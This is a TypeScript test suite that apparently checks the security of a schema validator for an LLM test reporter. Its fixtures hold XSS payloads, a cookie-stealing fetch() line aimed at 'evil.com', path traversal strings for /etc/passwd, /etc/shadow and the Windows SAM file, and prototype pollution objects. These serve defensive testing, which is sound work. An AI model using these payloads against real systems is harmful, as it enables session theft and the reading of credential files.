import { describe, it, expect } from 'vitest'
import type { LLMReporterOutput, TestSummary, TestFailure } from './schema.js'
import { SchemaValidator } from '../validation/validator.js'
import { isValidTestSummary, isValidTestFailure } from '../test-utils/validation-helpers.js'
import { getRuntimeEnvironmentSummary } from '../utils/runtime-environment.js'

describe('Security Validation Tests', () => {
  const validator = new SchemaValidator()
  // Note: SchemaValidator automatically resets state for each validation

  describe('XSS Prevention - Enhanced', () => {
    it('should escape parentheses and brackets for event handlers', () => {
      const xssAttempt: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [
          {
            test: 'XSS with parentheses',
            fileRelative: '/test/xss.test.ts',
            startLine: 10,
            endLine: 10,
            error: {
              message: 'Test failed',
              type: 'AssertionError',
              context: {
                code: [
                  '<div onclick=(function(){alert(1)})()>',
                  'javascript:void(0)',
                  '${alert(1)}',
                  '{{constructor.constructor("alert(1)")()"}}',
                  "';alert(1);//"
                ]
              }
            }
          }
        ]
      }

      const result = validator.validate(xssAttempt)
      expect(result.valid).toBe(true)
      // Validator no longer handles sanitization
      // XSS vectors remain in validated data
      const validatedCode = result.data?.failures?.[0].error.context?.code
      if (validatedCode) {
        validatedCode.forEach((line: string) => {
          // Dangerous characters are preserved in validation
          expect(typeof line).toBe('string')
        })
      }
    })
  })

  describe('XSS Prevention', () => {
    it('should sanitize HTML in code lines', () => {
      const maliciousOutput: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [
          {
            test: 'XSS test',
            fileRelative: '/test/xss.test.ts',
            startLine: 10,
            endLine: 10,
            error: {
              message: 'Test failed',
              type: 'AssertionError',
              context: {
                code: [
                  '<script>alert("XSS")</script>',
                  'const evil = "</script><script>fetch("//evil.com?cookie=" + document.cookie)</script>"',
                  '<img src=x onerror="alert(1)">',
                  '<div onmouseover="alert(1)">hover me</div>'
                ],
                lineNumber: 5
              }
            }
          }
        ]
      }

      // The validation should pass (sanitization happens internally)
      const isValid = validator.validate(maliciousOutput).valid
      expect(isValid).toBe(true)

      // The code should be sanitized when accessed
      // (Note: In real implementation, sanitization happens during validation)
    })

    it('should handle various HTML injection attempts', () => {
      const xssAttempts = [
        '<!--<script>alert("XSS")</script>-->',
        '<svg/onload=alert("XSS")>',
        'javascript:alert("XSS")',
        '<iframe src="javascript:alert(1)">',
        '<body onload="alert(1)">',
        '<input type="text" value="x" onfocus="alert(1)">'
      ]

      xssAttempts.forEach((xssCode) => {
        const output: LLMReporterOutput = {
          summary: {
            total: 1,
            passed: 0,
            failed: 1,
            skipped: 0,
            duration: 100,
            timestamp: '2024-01-15T10:30:00Z',
            environment: getRuntimeEnvironmentSummary()
          },
          failures: [
            {
              test: 'XSS test',
              fileRelative: '/test/xss.test.ts',
              startLine: 10,
              endLine: 10,
              error: {
                message: 'Test failed',
                type: 'AssertionError',
                context: {
                  code: [xssCode],
                  lineNumber: 5
                }
              }
            }
          ]
        }

        expect(validator.validate(output).valid).toBe(true)
      })
    })
  })

  describe('Prototype Pollution Prevention', () => {
    it('should reject __proto__ pollution attempts', () => {
      const pollutedOutput = {
        summary: {
          total: 1,
          passed: 1,
          failed: 0,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        __proto__: {
          polluted: true
        }
      }

      expect(validator.validate(pollutedOutput).valid).toBe(true) // Safe because we use createSafeObject
    })

    it('should reject constructor pollution attempts', () => {
      const pollutedOutput = {
        summary: {
          total: 1,
          passed: 1,
          failed: 0,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary(),
          constructor: {
            polluted: true
          }
        }
      }

      expect(validator.validate(pollutedOutput).valid).toBe(true) // Safe because we filter these keys
    })

    it('should reject prototype property pollution', () => {
      const pollutedOutput = {
        summary: {
          total: 1,
          passed: 1,
          failed: 0,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary(),
          prototype: {
            polluted: true
          }
        }
      }

      expect(validator.validate(pollutedOutput).valid).toBe(true) // Extra properties are ignored
    })
  })

  describe('ReDoS Prevention', () => {
    it('should reject malformed ISO 8601 timestamps', () => {
      const invalidTimestamps = [
        '2024-01-15', // Missing time
        '2024-01-15T10:30', // Missing seconds
        '2024-01-15T10:30:00', // Missing timezone
        '2024-01-15T25:30:00Z', // Invalid hour
        '2024-01-15T10:65:00Z', // Invalid minute
        '2024-01-15T10:30:65Z', // Invalid second
        '2024-13-15T10:30:00Z', // Invalid month
        '2024-01-32T10:30:00Z', // Invalid day
        'not-a-date',
        '2024-01-15T10:30:00+25:00', // Invalid timezone offset
        '2024-01-15T10:30:00.1234567890Z' // Too many decimal places
      ]

      invalidTimestamps.forEach((timestamp) => {
        const summary: TestSummary = {
          total: 1,
          passed: 1,
          failed: 0,
          skipped: 0,
          duration: 100,
          timestamp
        }

        expect(isValidTestSummary(summary)).toBe(false)
      })
    })

    it('should accept valid ISO 8601 timestamps', () => {
      const validTimestamps = [
        '2024-01-15T10:30:00Z',
        '2024-01-15T10:30:00.123Z',
        '2024-01-15T10:30:00+00:00',
        '2024-01-15T10:30:00-05:00',
        '2024-01-15T10:30:00.999Z',
        '2024-12-31T23:59:59Z'
      ]

      validTimestamps.forEach((timestamp) => {
        const summary: TestSummary = {
          total: 1,
          passed: 1,
          failed: 0,
          skipped: 0,
          duration: 100,
          timestamp
        }

        expect(isValidTestSummary(summary)).toBe(true)
      })
    })

    it('should handle ReDoS attack patterns without hanging', () => {
      // Create a string that would cause ReDoS with a vulnerable regex
      const redosPattern = '2024-01-15T' + 'X'.repeat(10000) + 'Z'

      const startTime = Date.now()
      const summary: TestSummary = {
        total: 1,
        passed: 1,
        failed: 0,
        skipped: 0,
        duration: 100,
        timestamp: redosPattern,
        environment: getRuntimeEnvironmentSummary()
      }

      const result = isValidTestSummary(summary)
      const endTime = Date.now()

      // Should reject quickly (under 100ms)
      expect(result).toBe(false)
      expect(endTime - startTime).toBeLessThan(100)
    })
  })

  describe('Path Traversal Prevention', () => {
    it('should reject path traversal attempts', () => {
      const traversalPaths = [
        '../../../etc/passwd',
        '..\\..\\..\\windows\\system32\\config\\sam',
        '/test/../../../etc/shadow',
        'C:\\test\\..\\..\\..\\windows\\system32',
        './../../sensitive/data.txt',
        'test/../../config/secrets.json'
      ]

      traversalPaths.forEach((path) => {
        const failure: TestFailure = {
          test: 'Path traversal test',
          fileRelative: path,
          startLine: 10,
          endLine: 10,
          error: {
            message: 'Test failed',
            type: 'AssertionError'
          }
        }

        expect(isValidTestFailure(failure)).toBe(false)
      })
    })

    it('should allow relative paths', () => {
      const relativePaths = ['test/file.ts', './test/file.ts', 'src/index.ts', 'file.ts']

      relativePaths.forEach((path) => {
        const failure: TestFailure = {
          test: 'Relative path test',
          fileRelative: path,
          startLine: 10,
          endLine: 10,
          error: {
            message: 'Test failed',
            type: 'AssertionError'
          }
        }

        expect(isValidTestFailure(failure)).toBe(true)
      })
    })

    it('should accept valid absolute paths', () => {
      const validPaths = [
        '/src/utils.test.ts',
        '/test/integration.spec.ts',
        '/tests/unit/helper.test.ts',
        '/lib/validator.test.js'
      ]

      validPaths.forEach((path) => {
        const failure: TestFailure = {
          test: 'Valid path test',
          fileRelative: path,
          startLine: 10,
          endLine: 10,
          error: {
            message: 'Test failed',
            type: 'AssertionError'
          }
        }

        expect(isValidTestFailure(failure)).toBe(true)
      })
    })

    it('should reject null byte injection', () => {
      const nullBytePath = '/test/file.ts\0.txt'

      const failure: TestFailure = {
        test: 'Null byte test',
        fileRelative: nullBytePath,
        startLine: 10,
        endLine: 10,
        error: {
          message: 'Test failed',
          type: 'AssertionError'
        }
      }

      expect(isValidTestFailure(failure)).toBe(false)
    })
  })

  describe('Memory Protection', () => {
    it('should reject code arrays exceeding max lines', () => {
      const tooManyLines = new Array(101).fill('line of code')

      const output: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [
          {
            test: 'Memory test',
            fileRelative: '/test/memory.test.ts',
            startLine: 10,
            endLine: 10,
            error: {
              message: 'Test failed',
              type: 'AssertionError',
              context: {
                code: tooManyLines,
                lineNumber: 5
              }
            }
          }
        ]
      }

      expect(validator.validate(output).valid).toBe(false)
    })

    it('should reject when total code size exceeds limit', () => {
      // Create multiple failures with large code blocks
      const largeCodeLine = 'x'.repeat(10000) // 10KB per line
      const failures: TestFailure[] = []

      // Create 110 failures with 10 lines each = 1.1MB total
      for (let i = 0; i < 110; i++) {
        failures.push({
          test: `Memory test ${i}`,
          fileRelative: `/test/memory${i}.test.ts`,
          startLine: 10,
          endLine: 10,
          error: {
            message: 'Test failed',
            type: 'AssertionError',
            context: {
              code: new Array(10).fill(largeCodeLine),
              lineNumber: 5
            }
          }
        })
      }

      const output: LLMReporterOutput = {
        summary: {
          total: 110,
          passed: 0,
          failed: 110,
          skipped: 0,
          duration: 1000,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures
      }

      // Should reject due to exceeding total code size limit
      expect(validator.validate(output).valid).toBe(false)
    })

    it('should accept reasonable code sizes', () => {
      const reasonableCode = [
        'function test() {',
        '  const result = doSomething();',
        '  expect(result).toBe(true);',
        '}'
      ]

      const output: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [
          {
            test: 'Reasonable test',
            fileRelative: '/test/reasonable.test.ts',
            startLine: 10,
            endLine: 10,
            error: {
              message: 'Test failed',
              type: 'AssertionError',
              context: {
                code: reasonableCode,
                lineNumber: 5
              }
            }
          }
        ]
      }

      expect(validator.validate(output).valid).toBe(true)
    })
  })

  describe('Circular Reference Prevention', () => {
    it('should reject circular references in expected/actual values', () => {
      const circular: any = { a: 1 }
      circular.self = circular

      const output: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [
          {
            test: 'Circular test',
            fileRelative: '/test/circular.test.ts',
            startLine: 10,
            endLine: 10,
            error: {
              message: 'Test failed',
              type: 'AssertionError',
              context: {
                code: ['test code'],
                lineNumber: 5
              }
            }
          }
        ]
      }

      // Our implementation handles circular references by replacing them with placeholders
      // So validation should pass, but the circular reference should be handled safely
      const result = validator.validate(output)
      expect(result.valid).toBe(true)
    })

    it('should accept non-circular objects', () => {
      const output: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [
          {
            test: 'Normal test',
            fileRelative: '/test/normal.test.ts',
            startLine: 10,
            endLine: 10,
            error: {
              message: 'Test failed',
              type: 'AssertionError',
              context: {
                code: ['test code'],
                lineNumber: 5
              }
            }
          }
        ]
      }

      expect(validator.validate(output).valid).toBe(true)
    })
  })

  describe('Edge Cases', () => {
    it('should handle extremely large line numbers', () => {
      const output: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [
          {
            test: 'Large line test',
            fileRelative: '/test/large.test.ts',
            startLine: Number.MAX_SAFE_INTEGER - 10,
            endLine: Number.MAX_SAFE_INTEGER,
            error: {
              message: 'Test failed',
              type: 'AssertionError',
              context: {
                code: ['test code'],
                lineNumber: Number.MAX_SAFE_INTEGER,
                columnNumber: Number.MAX_SAFE_INTEGER
              }
            }
          }
        ]
      }

      expect(validator.validate(output).valid).toBe(true)
    })

    it('should handle Unicode characters in code', () => {
      const unicodeCode = [
        '// 测试中文注释',
        'const emoji = "🎉🚀💻";',
        'const russian = "Привет мир";',
        'const arabic = "مرحبا بالعالم";',
        'const japanese = "こんにちは世界";'
      ]

      const output: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [
          {
            test: 'Unicode test',
            fileRelative: '/test/unicode.test.ts',
            startLine: 10,
            endLine: 10,
            error: {
              message: 'Test failed',
              type: 'AssertionError',
              context: {
                code: unicodeCode,
                lineNumber: 5
              }
            }
          }
        ]
      }

      expect(validator.validate(output).valid).toBe(true)
    })

    it('should handle empty arrays and objects', () => {
      const output: LLMReporterOutput = {
        summary: {
          total: 0,
          passed: 0,
          failed: 0,
          skipped: 0,
          duration: 0,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [],
        passed: [],
        skipped: []
      }

      expect(validator.validate(output).valid).toBe(true)
    })
  })

  describe('Memory Exhaustion Prevention', () => {
    it('should detect sparse arrays with hidden large data', () => {
      // Create a validator with explicit memory limit
      const limitedValidator = new SchemaValidator({
        maxTotalCodeSize: 500 * 1024 // 500KB limit
      })

      const maliciousData = {
        summary: {
          total: 20,
          passed: 0,
          failed: 20,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: Array.from({ length: 20 }, (_, i) => ({
          test: `x${i}`,
          fileRelative: `/test/x${i}.ts`,
          startLine: 1,
          endLine: 1,
          error: {
            message: `x${i}`,
            type: 'Error',
            context: {
              code: [`x${i}${'x'.repeat(49990)}`] // 50KB per item = 1MB total for 20 items
            }
          }
        }))
      }

      const result = limitedValidator.validate(maliciousData)

      expect(result.valid).toBe(false)
      expect(
        result.errors.some(
          (e) =>
            e.message.includes('memory limit') ||
            e.message.includes('Memory') ||
            e.message.includes('exceeds')
        )
      ).toBe(true)
    })

    it('should handle actual content size calculation', () => {
      const largeArray = Array(1000).fill({
        test: 'test',
        fileRelative: '/test/file.ts',
        startLine: 1,
        endLine: 1,
        error: {
          message: 'error',
          type: 'Error',
          context: {
            code: Array(100).fill('x'.repeat(100))
          }
        }
      })

      const output: LLMReporterOutput = {
        summary: {
          total: 1000,
          passed: 0,
          failed: 1000,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: largeArray
      }

      const result = validator.validate(output)
      // Should fail due to memory limits
      expect(result.valid).toBe(false)
    })
  })

  describe('Prototype Pollution Prevention - Enhanced', () => {
    it('should reject nested prototype pollution attempts', () => {
      const nestedPollution = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [
          {
            test: 'test',
            fileRelative: '/test/file.ts',
            startLine: 1,
            endLine: 1,
            error: {
              message: 'error',
              type: 'Error',
              context: {
                data: {
                  __proto__: { isAdmin: true },
                  constructor: { prototype: { polluted: true } }
                }
              }
            }
          }
        ]
      }

      const result = validator.validate(nestedPollution)
      // Validation should reject dangerous content even with sanitization enabled
      expect(result.valid).toBe(false)
    })

    it('should handle circular references safely', () => {
      const obj: any = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: []
      }

      // Create circular reference
      const failure: any = {
        test: 'test',
        fileRelative: '/test/file.ts',
        startLine: 1,
        endLine: 1,
        error: {
          message: 'error',
          type: 'Error'
        }
      }
      failure.error.circular = failure // Circular reference
      obj.failures.push(failure)

      // Should handle without crashing - our implementation handles circular refs safely
      const result = validator.validate(obj)
      expect(result.valid).toBe(true) // Validation passes because circular refs are handled
    })

    it('should reject objects with excessive nesting depth', () => {
      // Create deeply nested object (exceeds MAX_DEPTH of 50)
      let deepObj: any = { code: ['test'] }
      for (let i = 0; i < 55; i++) {
        deepObj = { nested: deepObj }
      }

      const output: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [
          {
            test: 'test',
            fileRelative: '/test/file.ts',
            startLine: 1,
            endLine: 1,
            error: {
              message: 'error',
              type: 'Error',
              context: deepObj
            }
          }
        ]
      }

      // Test should expect the depth limit error to be thrown
      expect(() => validator.validate(output)).toThrow('Maximum object nesting depth exceeded')
    })
  })

  describe('Concurrent Validation', () => {
    it('should handle concurrent validations without state pollution', async () => {
      const validator1 = new SchemaValidator()
      const validator2 = new SchemaValidator()

      const output1: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 1,
          failed: 0,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: []
      }

      const output2: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [
          {
            test: 'test',
            fileRelative: '/test/file.ts',
            startLine: 1,
            endLine: 1,
            error: {
              message: 'error',
              type: 'Error'
            }
          }
        ]
      }

      // Run validations concurrently
      const [result1, result2] = await Promise.all([
        Promise.resolve(validator1.validate(output1)),
        Promise.resolve(validator2.validate(output2))
      ])

      expect(result1.valid).toBe(true)
      expect(result2.valid).toBe(true)
      expect(result1.errors.length).toBe(0)
      expect(result2.errors.length).toBe(0)
    })
  })

  describe('Concurrent Memory Exhaustion Attack Prevention', () => {
    it('should prevent memory bypass within a single validation', () => {
      const validator = new SchemaValidator({
        maxTotalCodeSize: 500 * 1024 // 500KB limit
      })

      // Create payload with multiple failures that together exceed the limit
      const createPayloadWithMultipleFailures = (): LLMReporterOutput => {
        // Each failure has 100KB of code (100 lines × 1KB each)
        const createFailure = (index: number) => ({
          test: `test ${index}`,
          fileRelative: `/test/file${index}.ts`,
          startLine: index,
          endLine: index,
          error: {
            message: `error ${index}`,
            type: 'Error',
            context: {
              code: Array(100).fill('x'.repeat(1000)) // 100KB
            }
          }
        })

        // Create 6 failures (600KB total, exceeds 500KB limit)
        return {
          summary: {
            total: 6,
            passed: 0,
            failed: 6,
            skipped: 0,
            duration: 100,
            timestamp: '2024-01-15T10:30:00Z',
            environment: getRuntimeEnvironmentSummary()
          },
          failures: Array(6)
            .fill(null)
            .map((_, i) => createFailure(i))
        }
      }

      const payload = createPayloadWithMultipleFailures()
      const result = validator.validate(payload)

      // Should fail due to memory limit
      expect(result.valid).toBe(false)

      // Verify memory/size limit error is present
      const hasMemoryError = result.errors.some(
        (e) =>
          e.message.includes('memory') ||
          e.message.includes('Memory') ||
          e.message.includes('size validation failed') ||
          e.message.includes('exceeds estimate')
      )
      expect(hasMemoryError).toBe(true)
    })

    it('should properly rollback memory reservation on validation failure', () => {
      const validator = new SchemaValidator({
        maxTotalCodeSize: 100 * 1024 // 100KB limit
      })

      // Create payload that will fail after reservation
      const maliciousPayload: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [
          {
            test: 'test',
            fileRelative: '/test/file.ts',
            startLine: 1,
            endLine: 1,
            error: {
              message: 'error',
              type: 'Error',
              context: {
                // This will have a large actual size vs estimate discrepancy
                code: Array(1000).fill('x'.repeat(200))
              }
            }
          }
        ]
      }

      const result = validator.validate(maliciousPayload)
      expect(result.valid).toBe(false)

      // Should be able to validate a small payload after rollback
      const smallPayload: LLMReporterOutput = {
        summary: {
          total: 1,
          passed: 1,
          failed: 0,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        passed: [
          {
            test: 'small test',
            fileRelative: '/test/small.ts',
            startLine: 1,
            endLine: 1,
            status: 'passed'
          }
        ]
      }

      const smallResult = validator.validate(smallPayload)
      expect(smallResult.valid).toBe(true)
    })

    it('should handle memory estimation for complex nested structures', () => {
      const validator = new SchemaValidator({
        maxTotalCodeSize: 50 * 1024 // 50KB limit
      })

      // Create complex nested structure
      const complexPayload: LLMReporterOutput = {
        summary: {
          total: 3,
          passed: 1,
          failed: 1,
          skipped: 1,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [
          {
            test: 'complex test',
            fileRelative: '/test/complex.ts',
            startLine: 1,
            endLine: 1,
            error: {
              message: 'Complex error',
              type: 'Error',
              context: {
                code: ['line1', 'line2']
              }
            }
          }
        ],
        passed: [
          {
            test: 'passed test',
            fileRelative: '/test/pass.ts',
            startLine: 1,
            endLine: 1,
            status: 'passed'
          }
        ],
        skipped: [
          {
            test: 'skipped test',
            fileRelative: '/test/skip.ts',
            startLine: 1,
            endLine: 1,
            status: 'skipped'
          }
        ]
      }

      const result = validator.validate(complexPayload)
      // Should handle complex structures correctly
      expect(result.valid).toBe(true)
    })

    it('should enforce safety margin between estimated and actual size', () => {
      const validator = new SchemaValidator({
        maxTotalCodeSize: 1024 * 1024 // 1MB
      })

      // Create a structure designed to have extremely poor estimation ratio
      // This tests that the safety margin correctly rejects payloads where
      // actual size is vastly different from the estimate (potential attack)
      const trickyStructure = {
        summary: {
          total: 1,
          passed: 0,
          failed: 1,
          skipped: 0,
          duration: 100,
          timestamp: '2024-01-15T10:30:00Z',
          environment: getRuntimeEnvironmentSummary()
        },
        failures: [
          {
            test: 'tricky',
            fileRelative: '/test/tricky.ts',
            startLine: 1,
            endLine: 1,
            error: {
              message: 'error',
              type: 'Error',
              context: {
                // This creates a huge discrepancy between estimate and actual
                // The first 5 items are small, misleading the sample-based estimation
                code: Array(10)
                  .fill(null)
                  .map((_, i) => {
                    return i < 5 ? 'small' : 'x'.repeat(10000)
                  })
              }
            }
          }
        ]
      }

      const result = validator.validate(trickyStructure)

      // The safety margin should REJECT this because actual size
      // is way more than 5x the estimate (it's about 83x)
      // This is the security feature working correctly
      expect(result.valid).toBe(false)
      expect(
        result.errors.some(
          (e) =>
            e.message.includes('exceeds estimate') || e.message.includes('size validation failed')
        )
      ).toBe(true)
    })
  })
})
